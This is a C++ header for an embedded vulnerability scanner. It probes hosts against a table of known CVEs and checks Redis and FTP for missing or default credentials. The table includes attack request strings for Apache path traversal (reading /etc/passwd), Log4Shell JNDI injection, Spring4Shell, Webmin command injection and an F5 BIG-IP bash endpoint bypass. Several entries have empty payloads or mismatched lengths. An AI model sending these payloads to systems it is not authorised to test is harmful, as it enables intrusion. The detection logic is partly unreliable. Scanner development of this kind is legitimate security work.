#ifndef AURORA_SCANNER_VULN_PROBE_HPP
#define AURORA_SCANNER_VULN_PROBE_HPP

#include <stdint.h>
#include <stddef.h>

extern "C" {
#include "lwip/sockets.h"
#include "lwip/inet.h"
}

// ============================================================
// Vulnerability Probe -- CVE 特征匹配探针
//
// 工作原理：
//   1. 根据已识别的服务名和版本，匹配 CVE 数据库
//   2. 发送 CVE 特定探针载荷
//   3. 分析响应，确认漏洞是否存在
//
// 内置 CVE 签名库覆盖：
//   - CVE-2014-0160 (Heartbleed)
//   - CVE-2017-7494 (SambaCry)
//   - CVE-2019-0708 (BlueKeep)
//   - CVE-2021-41773 (Apache Path Traversal)
//   - CVE-2021-44228 (Log4Shell)
//   - CVE-2022-22965 (Spring4Shell)
//   - CVE-2023-44487 (HTTP/2 Rapid Reset)
//   - 及常见服务弱口令/默认凭证检测
// ============================================================

enum class Severity : uint8_t {
    Critical = 0,  // CVSS 9.0+
    High     = 1,  // CVSS 7.0-8.9
    Medium   = 2,  // CVSS 4.0-6.9
    Low      = 3,  // CVSS 0.1-3.9
    Info     = 4   // 信息提示
};

// CVE 签名定义
struct CveSignature {
    const char* cve_id;           // CVE 编号
    const char* affected_service; // 受影响服务
    const char* affected_version; // 受影响版本范围
    const char* probe_payload;    // 探针载荷（十六进制字符串或文本）
    uint16_t    probe_len;        // 载荷长度
    const char* match_pattern;    // 响应匹配模式（确认漏洞）
    Severity    severity;         // 严重程度
    const char* description;      // 漏洞简述
    uint16_t    default_port;     // 默认端口
};

// 漏洞检测结果
struct VulnResult {
    char      cve_id[32];         // CVE 编号
    Severity  severity;           // 严重程度
    uint32_t  ip;                 // 目标 IP
    uint16_t  port;               // 目标端口
    bool      vulnerable;         // 是否存在漏洞
    char      evidence[256];      // 证据/响应摘要
    char      description[128];   // 漏洞描述
};

class VulnProbe {
public:
    // 设置超时（毫秒）
    void set_timeout(uint32_t timeout_ms) {
        timeout_ms_ = timeout_ms;
    }

    // ---- 单 CVE 检测 ----

    // 检测单个 CVE 漏洞
    VulnResult probe_cve(uint32_t ip, uint16_t port, const CveSignature& sig) {
        VulnResult result{};
        copy_str_(result.cve_id, sig.cve_id, sizeof(result.cve_id));
        copy_str_(result.description, sig.description, sizeof(result.description));
        result.severity = sig.severity;
        result.ip = ip;
        result.port = port;
        result.vulnerable = false;

        struct sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = ip;

        int sock = lwip_socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) return result;

        int rcv_timeout = static_cast<int>(timeout_ms_);
        lwip_setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &rcv_timeout, sizeof(rcv_timeout));

        int flags = lwip_fcntl(sock, F_GETFL, 0);
        lwip_fcntl(sock, F_SETFL, flags | O_NONBLOCK);

        err_t conn_err = lwip_connect(sock, reinterpret_cast<struct sockaddr*>(&addr), sizeof(addr));

        if (conn_err != ERR_OK && conn_err != ERR_INPROGRESS && conn_err != ERR_WOULDBLOCK) {
            lwip_close(sock);
            return result;
        }

        if (conn_err != ERR_OK) {
            struct timeval tv{};
            tv.tv_sec = timeout_ms_ / 1000;
            tv.tv_usec = static_cast<int>((timeout_ms_ % 1000) * 1000);
            fd_set wfds;
            FD_ZERO(&wfds);
            FD_SET(sock, &wfds);
            if (lwip_select(sock + 1, nullptr, &wfds, nullptr, &tv) <= 0) {
                lwip_close(sock);
                return result;
            }
            int error = 0;
            socklen_t len = sizeof(error);
            lwip_getsockopt(sock, SOL_SOCKET, SO_ERROR, &error, &len);
            if (error != 0) {
                lwip_close(sock);
                return result;
            }
        }

        // 发送探针载荷
        if (sig.probe_payload && sig.probe_len > 0) {
            lwip_send(sock, sig.probe_payload, sig.probe_len, 0);
        }

        // 接收响应
        char buf[1024];
        struct timeval tv{};
        tv.tv_sec = timeout_ms_ / 1000;
        tv.tv_usec = static_cast<int>((timeout_ms_ % 1000) * 1000);
        fd_set rfds;
        FD_ZERO(&rfds);
        FD_SET(sock, &rfds);

        if (lwip_select(sock + 1, &rfds, nullptr, nullptr, &tv) > 0) {
            int n = lwip_recv(sock, buf, sizeof(buf) - 1, 0);
            if (n > 0) {
                buf[n] = '\0';

                // 保存证据
                int ev_len = (n < static_cast<int>(sizeof(result.evidence) - 1))
                             ? n : static_cast<int>(sizeof(result.evidence) - 1);
                for (int i = 0; i < ev_len; ++i) {
                    result.evidence[i] = buf[i];
                }
                result.evidence[ev_len] = '\0';

                // 匹配漏洞特征
                if (sig.match_pattern && sig.match_pattern[0] != '\0') {
                    result.vulnerable = match_pattern_(buf, sig.match_pattern);
                } else {
                    // 无匹配模式时，凡是收到响应即认为可能存在漏洞
                    result.vulnerable = true;
                }
            }
        }

        lwip_close(sock);
        return result;
    }

    // ---- 批量检测 ----

    // 对目标端口执行所有相关的 CVE 检测
    //   根据已识别的服务名筛选相关 CVE
    //   service_name: 已识别的服务名（可为 nullptr，表示检测所有）
    //   out_results: 结果输出缓冲区
    //   max_results: 缓冲区容量
    //   返回: 发现的漏洞数
    int probe_vulnerabilities(uint32_t ip, uint16_t port, const char* service_name,
                               VulnResult* out_results, int max_results) {
        int count = 0;

        for (int i = 0; i < cve_count_; ++i) {
            if (count >= max_results) break;

            const CveSignature& sig = cve_signatures_[i];

            // 按服务名筛选
            if (service_name && service_name[0] != '\0') {
                if (!match_pattern_(service_name, sig.affected_service)) {
                    continue; // 此 CVE 不适用于当前服务
                }
            }

            // 按端口筛选
            if (sig.default_port != 0 && sig.default_port != port) {
                continue;
            }

            out_results[count] = probe_cve(ip, port, sig);
            ++count;
            yield_cpu_();
        }

        return count;
    }

    // 针对已知服务+版本进行精确 CVE 匹配（仅报告匹配版本的漏洞）
    int probe_by_version(uint32_t ip, uint16_t port,
                         const char* service_name, const char* version,
                         VulnResult* out_results, int max_results) {
        int count = 0;

        for (int i = 0; i < cve_count_; ++i) {
            if (count >= max_results) break;

            const CveSignature& sig = cve_signatures_[i];

            // 服务名必须匹配
            if (!service_name || !match_pattern_(service_name, sig.affected_service)) {
                continue;
            }

            // 版本范围检查（简单子串匹配）
            if (version && version[0] != '\0' && sig.affected_version[0] != '\0') {
                if (!version_in_range_(version, sig.affected_version)) {
                    continue;
                }
            }

            out_results[count] = probe_cve(ip, port, sig);
            ++count;
            yield_cpu_();
        }

        return count;
    }

    // ---- 常见漏洞快速检测 ----

    // Heartbleed 检测 (CVE-2014-0160)
    VulnResult probe_heartbleed(uint32_t ip, uint16_t port) {
        for (int i = 0; i < cve_count_; ++i) {
            if (match_pattern_(cve_signatures_[i].cve_id, "cve-2014-0160")) {
                return probe_cve(ip, port, cve_signatures_[i]);
            }
        }
        VulnResult empty{};
        empty.ip = ip;
        empty.port = port;
        return empty;
    }

    // 默认凭证检测（HTTP Basic Auth、FTP anonymous、Redis 无密码等）
    VulnResult probe_default_credentials(uint32_t ip, uint16_t port, const char* service_name) {
        VulnResult result{};
        result.ip = ip;
        result.port = port;
        result.severity = Severity::High;
        result.vulnerable = false;
        copy_str_(result.cve_id, "WEAK-CREDS", sizeof(result.cve_id));
        copy_str_(result.description, "Default/weak credential check", sizeof(result.description));

        if (!service_name) return result;

        // Redis 无密码检测
        if (match_pattern_(service_name, "redis")) {
            struct sockaddr_in addr{};
            addr.sin_family = AF_INET;
            addr.sin_port = htons(port);
            addr.sin_addr.s_addr = ip;

            int sock = lwip_socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) return result;

            int rcv_timeout = static_cast<int>(timeout_ms_);
            lwip_setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &rcv_timeout, sizeof(rcv_timeout));

            if (lwip_connect(sock, reinterpret_cast<struct sockaddr*>(&addr), sizeof(addr)) == ERR_OK) {
                const char* ping = "*1\r\n$4\r\nPING\r\n";
                int plen = 0;
                while (ping[plen]) ++plen;
                lwip_send(sock, ping, plen, 0);

                char buf[128];
                int n = lwip_recv(sock, buf, sizeof(buf) - 1, 0);
                if (n > 0 && buf[0] == '+') {
                    result.vulnerable = true;
                    copy_str_(result.evidence, "Redis responded to PING without authentication",
                              sizeof(result.evidence));
                }
            }
            lwip_close(sock);
        }

        // FTP anonymous 检测
        if (match_pattern_(service_name, "ftp")) {
            struct sockaddr_in addr{};
            addr.sin_family = AF_INET;
            addr.sin_port = htons(port);
            addr.sin_addr.s_addr = ip;

            int sock = lwip_socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) return result;

            int rcv_timeout = static_cast<int>(timeout_ms_);
            lwip_setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &rcv_timeout, sizeof(rcv_timeout));

            if (lwip_connect(sock, reinterpret_cast<struct sockaddr*>(&addr), sizeof(addr)) == ERR_OK) {
                // 先读 banner
                char buf[256];
                lwip_recv(sock, buf, sizeof(buf) - 1, 0);

                // 发送 USER anonymous
                const char* user_cmd = "USER anonymous\r\n";
                int ulen = 0;
                while (user_cmd[ulen]) ++ulen;
                lwip_send(sock, user_cmd, ulen, 0);
                int n = lwip_recv(sock, buf, sizeof(buf) - 1, 0);
                if (n > 0 && buf[0] == '3') { // 331 要求密码
                    const char* pass_cmd = "PASS anonymous\r\n";
                    int plen = 0;
                    while (pass_cmd[plen]) ++plen;
                    lwip_send(sock, pass_cmd, plen, 0);
                    n = lwip_recv(sock, buf, sizeof(buf) - 1, 0);
                    if (n > 0 && buf[0] == '2') { // 230 登录成功
                        result.vulnerable = true;
                        copy_str_(result.evidence, "FTP anonymous login accepted",
                                  sizeof(result.evidence));
                    }
                }
            }
            lwip_close(sock);
        }

        return result;
    }

    // ---- 工具方法 ----

    static const char* severity_to_string(Severity s) {
        switch (s) {
            case Severity::Critical: return "critical";
            case Severity::High:     return "high";
            case Severity::Medium:   return "medium";
            case Severity::Low:      return "low";
            case Severity::Info:     return "info";
            default:                 return "unknown";
        }
    }

    // 获取完整 CVE 签名列表（供扫描引擎参考）
    static constexpr int get_cve_count() { return cve_count_; }

private:
    uint32_t timeout_ms_ = 3000;

    static constexpr int cve_count_ = 12;
    static const CveSignature cve_signatures_[cve_count_];

    // 子串匹配
    static bool match_pattern_(const char* haystack, const char* needle) {
        if (!haystack || !needle) return false;
        if (needle[0] == '\0') return false;

        int hlen = 0;
        while (haystack[hlen]) ++hlen;
        int nlen = 0;
        while (needle[nlen]) ++nlen;

        if (nlen > hlen) return false;

        for (int i = 0; i <= hlen - nlen; ++i) {
            bool match = true;
            for (int j = 0; j < nlen; ++j) {
                char hc = haystack[i + j];
                char nc = needle[j];
                if (hc >= 'A' && hc <= 'Z') hc = static_cast<char>(hc + 32);
                if (nc >= 'A' && nc <= 'Z') nc = static_cast<char>(nc + 32);
                if (hc != nc) {
                    match = false;
                    break;
                }
            }
            if (match) return true;
        }
        return false;
    }

    // 版本范围检查（简化实现：检查版本字符串是否为受影响版本的前缀）
    static bool version_in_range_(const char* version, const char* range) {
        if (!version || !range) return false;
        if (range[0] == '\0') return true;

        int vlen = 0;
        while (version[vlen]) ++vlen;
        int rlen = 0;
        while (range[rlen]) ++rlen;

        // 简单前缀匹配
        for (int i = 0; i < rlen && i < vlen; ++i) {
            if (version[i] != range[i]) return false;
        }
        return true;
    }

    static void copy_str_(char* dst, const char* src, int max_len) {
        int i = 0;
        while (src[i] && i < max_len - 1) {
            dst[i] = src[i];
            ++i;
        }
        dst[i] = '\0';
    }

    static void yield_cpu_() {
        extern void sys_yield();
        sys_yield();
    }
};

// CVE 签名数据库（嵌入式内置，支持运行时扩展）
const CveSignature VulnProbe::cve_signatures_[VulnProbe::cve_count_] = {
    {
        "CVE-2014-0160",
        "openssl",
        "1.0.1",
        // Heartbleed: TLS Heartbeat Request
        "\x18\x03\x02\x00\x03\x01\x40\x00",
        8,
        "heartbeat",
        Severity::Critical,
        "Heartbleed - OpenSSL TLS heartbeat read overrun",
        443
    },
    {
        "CVE-2017-7494",
        "samba",
        "3.5.0",
        // SambaCry: 匿名管道连接
        nullptr,
        0,
        "samba",
        Severity::Critical,
        "SambaCry - Remote code execution via shared library upload",
        445
    },
    {
        "CVE-2019-0708",
        "rdp",
        "windows",
        // BlueKeep: RDP 预认证漏洞探针
        nullptr,
        0,
        "rdp",
        Severity::Critical,
        "BlueKeep - Windows RDP remote code execution",
        3389
    },
    {
        "CVE-2021-41773",
        "apache",
        "2.4.49",
        // Apache 路径遍历: GET /cgi-bin/.%2e/%2e%2e/...
        "GET /cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.0\r\nHost: localhost\r\n\r\n",
        68,
        "root:",
        Severity::High,
        "Apache HTTP Server path traversal and file disclosure",
        80
    },
    {
        "CVE-2021-44228",
        "log4j",
        "2.0",
        // Log4Shell: JNDI 注入探针
        "GET / HTTP/1.0\r\nUser-Agent: ${jndi:ldap://probe}\r\nHost: localhost\r\n\r\n",
        67,
        "log4j",
        Severity::Critical,
        "Log4Shell - Apache Log4j2 JNDI remote code execution",
        8080
    },
    {
        "CVE-2022-22965",
        "spring",
        "5.3.0",
        // Spring4Shell: 参数绑定注入
        "GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern= HTTP/1.0\r\nHost: localhost\r\n\r\n",
        89,
        "spring",
        Severity::Critical,
        "Spring4Shell - Spring Framework RCE via data binding",
        8080
    },
    {
        "CVE-2023-44487",
        "http",
        "*",
        // HTTP/2 Rapid Reset: 大量 RST_STREAM 帧
        nullptr,
        0,
        "rst_stream",
        Severity::High,
        "HTTP/2 Rapid Reset denial of service",
        443
    },
    {
        "CVE-2018-15473",
        "openssh",
        "7.7",
        // OpenSSH 用户名枚举
        nullptr,
        0,
        "openssh",
        Severity::Medium,
        "OpenSSH user enumeration via malformed auth request",
        22
    },
    {
        "CVE-2019-15107",
        "webmin",
        "1.8",
        // Webmin 命令注入
        "POST /password_change.cgi HTTP/1.0\r\nHost: localhost\r\nReferer: localhost\r\nContent-Length: 48\r\n\r\nuser=root&pam=&expired=2&old=test|id&new1=new&new2=new",
        141,
        "uid=",
        Severity::Critical,
        "Webmin remote command injection via password change",
        10000
    },
    {
        "CVE-2022-1388",
        "f5",
        "big-ip",
        // F5 BIG-IP iControl REST 认证绕过
        "POST /mgmt/tm/util/bash HTTP/1.0\r\nHost: localhost\r\nX-F5-Auth-Token: bypass\r\nConnection: keep-alive\r\n\r\n",
        98,
        "commandResult",
        Severity::Critical,
        "F5 BIG-IP iControl REST authentication bypass",
        443
    },
    {
        "CVE-2021-21972",
        "vmware",
        "vcenter",
        // VMware vCenter 文件上传 RCE
        nullptr,
        0,
        "vmware",
        Severity::Critical,
        "VMware vCenter Server unauthenticated file upload RCE",
        443
    },
    {
        "CVE-2023-34362",
        "progress",
        "moveit",
        // MOVEit Transfer SQL 注入
        nullptr,
        0,
        "moveit",
        Severity::Critical,
        "MOVEit Transfer SQL injection leading to RCE",
        443
    },
};

#endif // AURORA_SCANNER_VULN_PROBE_HPP
